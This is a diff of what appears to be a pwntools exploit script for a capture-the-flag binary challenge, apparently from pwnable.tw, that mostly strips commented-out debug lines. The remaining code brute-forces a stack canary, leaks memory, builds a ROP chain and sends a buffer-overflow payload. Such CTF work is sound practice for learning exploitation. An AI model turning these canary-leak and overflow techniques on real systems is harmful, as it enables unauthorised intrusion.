@@ -7,9 +7,6 @@ elf = ELF(pwnable)
 context(terminal=['tmux', 'new-window'])
 context(os = 'linux', arch = 'x86_64')
 
-#context.log_level = 'DEBUG'
-
-#setarch $(uname -m) -R /bin/bash
 debug_set = ''
 
 debug_set_1 = '''
@@ -56,13 +53,9 @@ if len(sys.argv) > 2 and sys.argv[1] == 'debug':
     p = process(pwnable)
     gdb.attach(p, debug_set_3)
 elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
-    #p = process("./seethefile", env=env)
-    #gdb.attach(p, debug_set_1)
     p = process(pwnable)
     gdb.attach(p, debug_set_4)
 else:
-    #p = process('./seethefile')
-    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
     p = process(pwnable)
     #p = remote('chall.pwnable.tw', 10205)
 
@@ -95,10 +88,6 @@ def leak_canary_and_code():
                 continue
             p.recvuntil(">>")
             p.sendline("1111111111111111" + temp_payload)
-            #p.sendline("1")
-            #p.sendline("1")
-            #p.recvuntil(":")
-            #p.sendline(temp_payload)
             print("try : " + temp_canary)
             response = p.recvline()
             if "Failed !" in response:
@@ -177,18 +166,6 @@ def leak_stack(leaked_canary):
                 break
     return temp_canary
 
-#p.recvuntil(">>")
-#p.sendline("1")
-#p.recvuntil(":")
-#p.sendline("\x00" + 'B'*62)
-#p.sendline("B")
-
-#copy('A' * 63)
-#p.recvuntil(">>")
-#p.sendline("1")
-
-#debug_set_2
-
 def leak_step_1():
     leaked_mem = leak_canary()
     canary = leaked_mem[:32]
@@ -233,7 +210,6 @@ def overflow():
     print("elf.addressi :: " + hex(elf.symbols['puts']))
 
     rop = ROP(elf)
-    #rop.call(elf.symbols['puts'], [elf.got['puts']])
     rop.call(elf.plt['puts'])
 
     print rop.dump()
@@ -241,28 +217,11 @@ def overflow():
     p.recvuntil(">>")
     p.send("1")
     p.recvuntil(":")
-    #p.sendline("\x00" + "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaAAAAAAAABBBBBBBB" + p64(0x7fffffffe4f0) + p64(0x555555554ca0))
-    #p.send("\x00" + '1' * 79)
     p.send("\x00" + '1' * (79))
-    #p.sendline("\x00" + "aaaaaaaabaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
-    #p.sendline("\x00" + "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaa" + p64(0x555555554ecd) + p64(0x00007fffffffe4f0))
-    #copy('A' * 63)
     copy('11')
 
-    #p.recvuntil(">>")
-    #p.sendline("1111111111111111")
-    #p.recvuntil(":")
-    #p.sendline("1")
-    #p.recvuntil(">>")
-    #p.sendline("1")
-    #p.recvuntil(":")
-    #p.sendline("1")
 
 overflow()
-#leak_step_1()
-#leak_canary_and_base()
-#p.recvuntil(">>")
-#p.sendline("1")
 
 p.recvuntil(">>")
 p.sendline("2")
